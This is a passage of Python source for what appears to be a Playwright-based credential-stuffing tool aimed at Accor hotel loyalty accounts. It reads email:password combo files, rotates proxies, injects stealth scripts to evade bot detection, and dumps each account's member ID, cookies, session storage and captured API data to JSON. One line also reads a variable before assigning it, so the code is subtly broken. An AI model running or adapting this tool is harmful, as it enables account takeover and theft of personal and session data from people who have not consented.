        ctx_kwargs: Dict[str, Any] = dict(
            viewport={"width": 1366, "height": 850},
            screen={"width": 1920, "height": 1080},
            user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            locale="en-US",
            timezone_id="Europe/Paris",
            color_scheme="light",
            device_scale_factor=1,
        )
        if use_state:
            ctx_kwargs["storage_state"] = str(STORAGE_STATE)
        ctx = await browser.new_context(**ctx_kwargs)
        await ctx.add_init_script(_STEALTH_JS)
        await _wire_response_capture(ctx, bag, raw_log)
        page = await ctx.new_page()
        if use_state:
            _log("reusing session — going straight to account")
            await page.goto(ACCOR_ACCOUNT, wait_until="domcontentloaded", timeout=45000)
            await page.wait_for_timeout(2500)
            session_ok = bag.has_auth_success() or "/account/en/" in page.url
            if not session_ok:
                _log("saved session stale; falling back to fresh login")
                use_state = False
        if not use_state:
            if not email or not password:
                print("ERROR: provide --email/--password or set env vars", file=sys.stderr)
                await browser.close()
                return 2
            if not await _do_login(page, email, password, args, bag):
                err_html = OUT_DIR / "login_failed.html"
                err_png = OUT_DIR / "login_failed.png"
                with suppress(Exception):
                    err_html.write_text(await page.content())
                with suppress(Exception):
                    await page.screenshot(path=str(err_png), full_page=True)
                _log(f"login failed — see {err_html} + {err_png}")
                if not args.keep_open:
                    await browser.close()
                return 3
            _log("login OK — saving session")
            with suppress(Exception):
                await ctx.storage_state(path=str(STORAGE_STATE))
        summary = await _crawl_account(page)
        spa_state = await _grab_page_state(page)
        member_id = "unknown"
        for item in bag.items.values():
            body = item.body if isinstance(body, dict) else None
            if not body:
                continue
            for key in ("memberId", "cardNumber", "customerId", "id"):
                val = body.get(key) if isinstance(body, dict) else None
                if val and str(val) != "0":
                    member_id = str(val)
                    break
            if member_id != "unknown":
                break
        cookies = await ctx.cookies()
        storage_state = await ctx.storage_state()
        dump = {
            "captured_at": _now(),
            "member_id": member_id,
            "spa_state": spa_state,
            "tab_summary": summary,
            "captured_apis": bag.to_list(),
            "cookies": cookies,
            "storage_state": storage_state,
        }
        out_path = OUT_DIR / f"accor_account_{_slugify(member_id)}.json"
        _safe_write(out_path, dump)
        with suppress(Exception):
            await ctx.storage_state(path=str(STORAGE_STATE))
        _print_result(dump, out_path, raw_log)
        if args.keep_open:
            _clog("Browser left open (--keep-open). Ctrl+C to quit.", "info")
            try:
                while True:
                    await asyncio.sleep(3600)
            except KeyboardInterrupt:
                pass
        await browser.close()
        return 0

# ── argument parsing ────────────────────────────────────────
def _parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(description=__doc__.splitlines()[1])
    p.add_argument("--email", default=None, help="Single account email")
    p.add_argument("--password", default=None, help="Single account password")
    p.add_argument("--combo", default=None, help="Combo file (email:pass per line)")
    p.add_argument("--proxy", default=None, help="Single proxy URL (http://user:pass@host:port)")
    p.add_argument("--proxy-file", default=None, help="File with proxies (one per line)")
    p.add_argument("--show", action="store_true", help="Make Chrome window visible")
    p.add_argument("--headless", action="store_true", help="True headless mode (lower success rate)")
    p.add_argument("--fresh", action="store_true", help="Ignore saved storage_state (single mode only)")
    p.add_argument("--keep-open", action="store_true", help="Don't close browser after dump")
    return p.parse_args()

async def main() -> int:
    _print_banner()
    args = _parse_args()
    if args.combo:
        if not Path(args.combo).is_file():
            _clog(f"Combo file not found: {args.combo}", "err")
            return 1
        proxy_list = []
        if args.proxy_file:
            if Path(args.proxy_file).is_file():
                with open(args.proxy_file, "r") as f:
                    for line in f:
                        line = line.strip()
                        if line:
                            proxy_list.append(line)
            else:
                _clog(f"Proxy file not found: {args.proxy_file}", "err")
                return 1
        elif args.proxy:
            proxy_list = [args.proxy]
        return await run_combo_mode(Path(args.combo), proxy_list, args)
    else:
        email = args.email or os.environ.get("ACCOR_EMAIL") or ""
        password = args.password or os.environ.get("ACCOR_PASSWORD") or ""
        if not email or not password:
            _sep("CREDENTIALS")
            if not email:
                email = input(f"{Fore.YELLOW}  Email   : {Style.RESET_ALL}").strip()
            if not password:
                password = getpass.getpass(f"{Fore.YELLOW}  Password: {Style.RESET_ALL}")
        return await run_single_mode(email, password, args)

if __name__ == "__main__":
    try:
        sys.exit(asyncio.run(main()))
    except KeyboardInterrupt:
        sys.exit(130)